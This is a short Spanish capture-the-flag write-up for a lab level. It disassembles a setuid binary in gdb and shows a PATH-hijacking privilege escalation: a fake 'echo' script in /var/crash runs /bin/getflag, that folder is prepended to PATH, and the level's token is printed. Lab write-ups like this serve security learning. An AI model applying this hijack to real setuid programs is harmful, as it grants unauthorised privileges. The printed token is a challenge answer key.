## Level 03

Lo primero que vemos al entrar es un ejecutable, nada más.
Asi que lo destripamos.

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave
   0x08048504 <+96>:    ret
End of assembler dump.
(gdb) x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```

Vemos que llama a la función echo sin el path completo usaldo la variable de entorno PATH. Si creamos una función llamada echo y en el path añadimos la nuestro folder, entoncees ejecutará primero nuestra función:
Con vim, creamos un fichero en la carpeta "/var/crash/" que se llama echo que lleve:
```shell
#!/bin/bash
/bin/getflag
```

Y segidamente añadimos al path;
```bash
export PATH=/var/crash:$PATH
```
Al ejecutar ./level03 obtenemos:

Check flag.Here is your token : qi0maab88jeaj46qoumi7maus